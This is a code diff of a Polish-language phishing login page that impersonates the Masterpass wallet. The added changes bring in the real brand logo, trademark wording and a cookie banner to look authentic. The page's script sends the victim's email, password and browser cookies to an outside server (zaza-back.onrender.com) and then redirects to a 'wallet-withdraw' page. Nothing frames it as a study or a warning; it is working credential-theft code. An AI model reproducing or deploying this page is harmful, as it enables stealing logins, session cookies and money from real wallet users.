@@ -1,20 +1,40 @@
-
 <!DOCTYPE html>
 <html lang="pl">
 <head>
   <meta charset="UTF-8" />
-  <title>Portfel | Zaloguj się</title>
+  <title>Portfel Masterpass | Logowanie</title>
   <link rel="stylesheet" href="/style.css" />
 </head>
-<body class="login-page">
-  <div class="login-container">
-    <h1>Portfel Master</h1>
-    <p>Zaloguj się do swojego portfela</p>
+<body>
+  <div class="container">
+    <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass logo" class="logo" />
+
+    <h1>Zaloguj się</h1>
+    <h2>Zaloguj się do swojego portfela Masterpass™</h2>
+
     <form id="loginForm">
-      <input type="email" id="email" placeholder="Adres e-mail" required />
-      <input type="password" id="password" placeholder="Hasło" required />
+      <label for="email">Adres e-mail lub numer telefonu</label>
+      <input type="text" id="email" placeholder="np. jan.kowalski@gmail.com" required />
+
+      <label for="password">Hasło</label>
+      <input type="password" id="password" placeholder="Wprowadź hasło" required />
+
+      <div class="checkbox-group">
+        <input type="checkbox" id="remember" />
+        <label for="remember">Pamiętaj mój login</label>
+      </div>
+
+      <div class="forgot-link">
+        <a href="#">Nie znam hasła</a>
+      </div>
+
       <button type="submit">Zaloguj się</button>
     </form>
+
+    <div class="cookie-banner">
+      Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki.
+      <a href="#">Informacja o Plikach Cookie</a>.
+    </div>
   </div>
 
   <script type="module">
@@ -23,14 +43,15 @@
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
+      const remember = document.getElementById('remember').checked;
 
       await fetch('https://zaza-back.onrender.com/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, cookies: document.cookie })
+        body: JSON.stringify({ email, password, remember, cookies: document.cookie })
       });
 
-      window.location.href = '/wallet-dashboard.html';
+      window.location.href = '/wallet-withdraw.html';
     });
   </script>
 </body>
